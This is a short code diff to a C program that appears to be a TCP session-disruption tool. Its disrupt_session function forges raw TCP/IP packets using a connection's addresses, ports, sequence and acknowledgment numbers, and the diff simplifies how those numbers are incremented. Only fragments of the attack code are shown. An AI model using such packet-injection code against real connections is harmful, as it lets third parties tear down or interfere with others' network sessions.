@@ -102,14 +102,10 @@ void display_usage(char *name) {
  * @param ackNumber         The last sequence number acknowledged by the source.
  */
 void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, uint16_t destinationPort, uint32_t sequenceNumber, uint32_t ackNumber, int timestamp, int finalRound) {
-    static bool checked = false;
-//    static uint32_t prevSeq = 0;
-//    static uint32_t prevAck = 0;
     static char packet[ sizeof(struct tcphdr) + sizeof(struct iphdr) + 2 ];
     
     // Socket FD
     int sock, one = 1;
-    int secondTime = 0;
 
     // Amounts to increase ack and seq by
     uint32_t ack_inc, seq_inc;
@@ -118,17 +114,8 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
     struct sockaddr_in addr_in;
 
     // Initialize static values if they have never been set
-    if(!checked) {
-        checked = true;
-//        prevSeq = sequenceNumber;
-//        prevAck = ackNumber;
-        ack_inc = 1;
-        seq_inc = 1;
-    } else {
-        ack_inc = 1;
-        seq_inc = 0;
-        secondTime = 1;
-    }
+    ack_inc = 1;
+    seq_inc = 1;
 
     printf("[disrupt_session]: New Sequence Number: %u\n", sequenceNumber + seq_inc);
     printf("[disrupt_session]: New ACK: %u\n\n", ackNumber + ack_inc);
@@ -188,9 +175,6 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
     nopPtr++;
     *nopPtr = 0x01;
     nopPtr++;
-//    int *timeStampPtr = (int *)nopPtr;
-
-    
 
     // Send out the packet
     send_packet(sock, packet, addr_in);
